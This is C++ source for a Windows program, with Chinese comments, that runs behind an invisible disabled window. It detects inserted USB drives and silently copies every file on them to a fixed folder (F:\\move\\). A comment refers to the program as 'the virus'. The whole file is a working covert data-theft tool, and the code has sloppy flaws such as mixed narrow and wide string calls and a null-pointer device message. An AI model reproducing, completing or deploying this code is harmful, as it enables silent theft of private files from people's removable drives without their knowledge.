#include <windows.h>
#include <Shlwapi.h>
#include "fstream"
#include <TlHelp32.h>
#include <Dbt.h>
#include "tchar.h"
#pragma comment(lib,"shlwapi.lib")
#define MAX_THREADS 10//线程数
#define TIMER 1//计时器
int i = 0;
//function 
TCHAR szExePath[MAX_PATH];//the virus's path
TCHAR U[2];//保存U盘的盘符
TCHAR szSysPath[MAX_PATH];//system path
BOOL SearchFile(TCHAR* szPath);//遍历文件夹所有的文件
//global variable
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);//窗口过程
//获取盘符
TCHAR FirstDriveFromMask(ULONG unitmask);
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
	PSTR szCmdLine, int iCmdShow)
{
	static TCHAR szAppName[] = TEXT("UUUUUU");
	HWND               hwnd;
	MSG                msg;
	WNDCLASS           wndclass;

	wndclass.style = 0;
	wndclass.lpfnWndProc = WndProc;
	wndclass.cbClsExtra = 0;
	wndclass.cbWndExtra = 0;
	wndclass.hInstance = hInstance;
	wndclass.hIcon = 0;
	wndclass.hCursor = 0;
	wndclass.hbrBackground = 0;
	wndclass.lpszMenuName = NULL;
	wndclass.lpszClassName = szAppName;
	if (!RegisterClass(&wndclass))
	{
		MessageBox(NULL, TEXT("Program requires Windows NT!"),
			szAppName, MB_ICONERROR);
		return 0;
	}
	hwnd = CreateWindow(szAppName, NULL,
		WS_DISABLED,
		0, 0,
		0, 0,
		NULL, NULL, hInstance, NULL);
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return msg.wParam;
}
LRESULT OnDeviceChange(HWND hwnd, WPARAM wParam, LPARAM lParam)
{
	PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;
	switch (wParam)
	{
	case DBT_DEVICEARRIVAL: //插入
		if (lpdb->dbch_devicetype == DBT_DEVTYP_VOLUME)
		{
			PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
			U[0] = FirstDriveFromMask(lpdbv->dbcv_unitmask);//得到u盘盘符
			//	MessageBox(0, U, _T("Notice!"), MB_OK);
			SearchFile(U);//遍历U盘文件
		}
		break;
	case DBT_DEVICEREMOVECOMPLETE: //设备删除
		break;
	}
	return LRESULT();
}
LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM
	lParam)
{
	switch (message)
	{
	case WM_CREATE:           //处理一些要下面要用到的全局变量
		U[1] = ':';

		SetTimer(hwnd, TIMER, 5000, 0);//启动计时器

		return 0;
	case WM_TIMER:             //timer message 

		SendMessage(hwnd, WM_DEVICECHANGE, 0, 0);//检测有没有插入设备消息

		return 0;
	case WM_DEVICECHANGE:
		OnDeviceChange(hwnd, wParam, lParam);
		return 0;
	case WM_DESTROY:
		KillTimer(hwnd, TIMER);
		PostQuitMessage(0);
		return 0;
	}
	return DefWindowProc(hwnd, message, wParam, lParam);
}

TCHAR FirstDriveFromMask(ULONG unitmask)
{
	char i;
	for (i = 0; i < 26; ++i)
	{
		if (unitmask & 0x1)//看该驱动器的状态是否发生了变化
			break;
		unitmask = unitmask >> 1;
	}
	return (i + 'A');
}
BOOL SearchFile(TCHAR* szPath)
{
	WIN32_FIND_DATA windata = { 0 };            //文件信息结构
	HANDLE hFile = NULL;
	TCHAR szPathNext[MAX_PATH];					//存放下一级目录路径
	TCHAR UFPaht[500], TagPath[200];			//U盘文件路径 创建存放的目录 
	ZeroMemory(szPathNext, sizeof(szPathNext));
	_stprintf(szPathNext, _T("%s//*.*"), szPath);     //递归的时候继续深入下一级目录查找文件 
	hFile = FindFirstFile(szPathNext, &windata);//查找第一个文件（夹）
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	do
	{
		if (windata.cFileName[0] == '.')         //如果是当前目录或者上级目录，则进入下一次循环
			continue;
		if (windata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) //判断是否是文件夹
		{
			_stprintf(szPathNext, _T("%s\\%s"), szPath, windata.cFileName);
			SearchFile(szPathNext); //递归查找
		}
		else
		{
			printf("%s//%s\n", szPath, windata.cFileName);//如果是文件则输出文件路径wcscat(szPath,windata.cFileName)
			//MessageBox(0, windata.cFileName,, MB_OK);
			wcscpy(TagPath, _T("F:\\move\\"));
			wcscpy(UFPaht, szPath);
			wcscat(UFPaht, _T("\\"));//在文件夹路径后填补 
			wcscat(UFPaht, windata.cFileName);//将u盘文件路径补全
			wcscat(TagPath, windata.cFileName);//目标文件路径补全
			/*
			创建线程
			复制文件
			写入错误信息
			(待扩展)
			*/
			CopyFile(UFPaht,TagPath,false);//复制文件 

		}

	} while (FindNextFile(hFile, &windata));     //如果深入到最后一层没有文件了则以次退出到上一层目录
	FindClose(hFile);
	return TRUE;
}
